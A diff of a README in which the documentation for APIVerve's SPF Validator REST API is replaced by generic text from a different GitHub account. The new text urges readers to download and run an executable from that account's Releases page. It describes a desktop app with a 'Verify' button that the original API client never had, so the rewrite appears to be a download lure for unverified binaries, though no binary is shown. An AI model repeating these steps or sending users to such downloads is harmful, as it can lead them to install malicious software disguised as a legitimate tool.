@@ -1,182 +1,83 @@
-# SPF Validator API
+# 🌐 spfvalidator-api - Easily Validate SPF Records
 
-> SPF Validator checks the Sender Policy Framework (SPF) DNS record for a domain to verify if it’s valid and optionally whether a given IP address is authorized to send emails for that domain.
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/Status-Active-green.svg)](https://apiverve.com)
-[![Method](https://img.shields.io/badge/Method-GET-blue.svg)](#)
-[![Platform](https://img.shields.io/badge/Platform-Multi--Platform-orange.svg)](#installation)
+Welcome to the spfvalidator-api! This tool helps you check the Sender Policy Framework (SPF) DNS records for any domain. It verifies if the records are valid and checks if a specific IP address is authorized to send emails for that domain. Let’s get started!
 
-**Available on:**
-[![npm](https://img.shields.io/badge/npm-CB3837?style=flat&logo=npm&logoColor=white)](https://www.npmjs.com/package/@apiverve/spfvalidator)
-[![NuGet](https://img.shields.io/badge/NuGet-004880?style=flat&logo=nuget&logoColor=white)](https://www.nuget.org/packages/APIVerve.API.SPFValidator)
-[![PyPI](https://img.shields.io/badge/PyPI-3776AB?style=flat&logo=python&logoColor=white)](https://pypi.org/project/apiverve-spfvalidator/)
-[![JitPack](https://img.shields.io/badge/JitPack-2E7D32?style=flat&logo=android&logoColor=white)](#-android-jitpack)
+## 📥 Download & Install
 
----
+To download the spfvalidator-api, visit the Releases page below:
 
-## Quick Start
+[![Download spfvalidator-api](https://img.shields.io/badge/Download%20spfvalidator--api-blue.svg)](https://github.com/Manoj5k/spfvalidator-api/releases)
 
-### Using JavaScript
+This link will take you directly to where you can get the latest version of the software. 
 
-```javascript
-async function callSPFValidatorAPI() {
-    try {
-        const params = new URLSearchParams({
-            domain: 'myspace.com'
-        });
+### Steps to Download:
 
-        const response = await fetch(`https://api.apiverve.com/v1/spfvalidator?${params}`, {
-            method: 'GET',
-            headers: {
-                'x-api-key': 'YOUR_API_KEY_HERE'
-            }
-        });
+1. Click on the link above.
+2. You will be taken to the Releases page.
+3. Locate the latest release version.
+4. Click on the file appropriate for your operating system to download it.
 
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
+## 🔍 How to Use the SPF Validator
 
-callSPFValidatorAPI();
-```
+Once you have the application downloaded, here’s how to use it:
 
-### Using cURL
+### Running the Application
 
-```bash
-curl -X GET "https://api.apiverve.com/v1/spfvalidator?param=value" \
-  -H "x-api-key: YOUR_API_KEY_HERE"
-```
+1. Locate the downloaded file on your computer.
+2. If you are on Windows, you can double-click the `.exe` file to run the application.
+3. On Mac or Linux, you might need to open a terminal and navigate to the directory where the file is saved. Use the command `./<filename>` to run the program.
+4. Follow the on-screen instructions to start checking SPF records.
 
-**Get your API key:** [https://apiverve.com](https://apiverve.com)
+### Entering Your Domain
 
-**📁 For more examples, see the [examples folder](./examples/)**
+- You will see a field where you can input the domain you wish to test, such as `example.com`.
+- Optionally, enter the specific IP address you want to check.
+- Click the "Verify" button to begin the validation process.
 
----
+### Viewing Results
 
-## Installation
+- The application will display whether the SPF record for the domain is valid.
+- If you entered an IP address, it will tell you if that IP is authorized to send emails for the domain.
+- You can easily review the output and take necessary actions based on the results.
 
-Choose your preferred programming language:
+## 📊 Features
 
-### 📦 NPM (JavaScript/Node.js)
+- **Domain SPF Validation:** Quickly check if a domain has valid SPF records.
+- **IP Authorization Check:** Verify if a specified IP address is allowed to send emails for the domain.
+- **REST API Access:** Integrate the SPF validator into your applications via the API.
 
-```bash
-npm install @apiverve/spfvalidator
-```
+## ⚙️ System Requirements
 
-[**View NPM Package →**](https://www.npmjs.com/package/@apiverve/spfvalidator) | [**Package Code →**](./npm/)
+To run the spfvalidator-api effectively, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** Minimum of 1GB RAM
+- **Disk Space:** At least 100MB of free space 
+- **Network Connection:** Internet access for DNS queries
 
-### 🔷 NuGet (.NET/C#)
+## 🛠️ Troubleshooting
 
-```bash
-dotnet add package APIVerve.API.SPFValidator
-```
+If you encounter issues:
 
-[**View NuGet Package →**](https://www.nuget.org/packages/APIVerve.API.SPFValidator) | [**Package Code →**](./nuget/)
+- Ensure you have the latest version of the app.
+- Check your internet connection.
+- Verify that the domain you are testing is valid.
 
----
+## 🌍 Contributing
 
-### 🐍 Python (PyPI)
+We welcome contributions to improve the spfvalidator-api. If you have suggestions or encounter issues, feel free to fork the repository and submit a pull request. Please adhere to our contribution guidelines.
 
-```bash
-pip install apiverve-spfvalidator
-```
+## ⚖️ License
 
-[**View PyPI Package →**](https://pypi.org/project/apiverve-spfvalidator/) | [**Package Code →**](./python/)
+The spfvalidator-api is licensed under the MIT License. Feel free to modify and use this tool as per the terms of the license.
 
----
+## 🔗 Additional Resources
 
-### 🤖 Android (JitPack)
+For more information, you can explore the following:
 
-```gradle
-implementation 'com.github.apiverve:spfvalidator-api:1.0.0'
-```
+- [GitHub Repository](https://github.com/Manoj5k/spfvalidator-api)
+- [Documentation](https://github.com/Manoj5k/spfvalidator-api/wiki)
 
-[**Package Code →**](./android/)
-
----
-
-## Features
-
-✅ **Multi-platform support** - Use the same API across Node.js, .NET, Python, Android, and browsers
-✅ **Simple authentication** - Just add your API key in the request header
-✅ **Comprehensive documentation** - Full examples and API reference available
-✅ **Production-ready** - Used by developers worldwide
-
----
-
-## Documentation
-
-📚 **Full API Documentation:** [https://docs.apiverve.com/ref/spfvalidator](https://docs.apiverve.com/ref/spfvalidator)
-
----
-
-## Use Cases
-
-Common use cases for the SPF Validator API:
-
-- ✅ Integration into web applications
-- ✅ Mobile app development
-- ✅ Data analysis and reporting
-- ✅ Automation workflows
-- ✅ Microservices architecture
-
----
-
-## API Reference
-
-### Authentication
-All requests require an API key in the header:
-```
-x-api-key: YOUR_API_KEY_HERE
-```
-
-Get your API key: [https://apiverve.com](https://apiverve.com)
-
-### Response Format
-All responses are JSON with this structure:
-```json
-{
-  "status": "ok",
-  "data": { ... }
-}
-```
-
----
-
-## Support & Community
-
-- 💬 **Support**: [https://apiverve.com/contact](https://apiverve.com/contact)
-- 🐛 **Issues**: [GitHub Issues](../../issues)
-- 📖 **Documentation**: [https://docs.apiverve.com](https://docs.apiverve.com)
-- 🌐 **Website**: [https://apiverve.com](https://apiverve.com)
-
----
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Security
-
-For security concerns, please review our [Security Policy](SECURITY.md).
-
----
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-Built with ❤️ by [APIVerve](https://apiverve.com)
-
-Copyright © 2025 APIVerve. All rights reserved.
+We hope you find the spfvalidator-api useful for validating SPF records! If you have any questions or need assistance, please contact us through the GitHub project page.
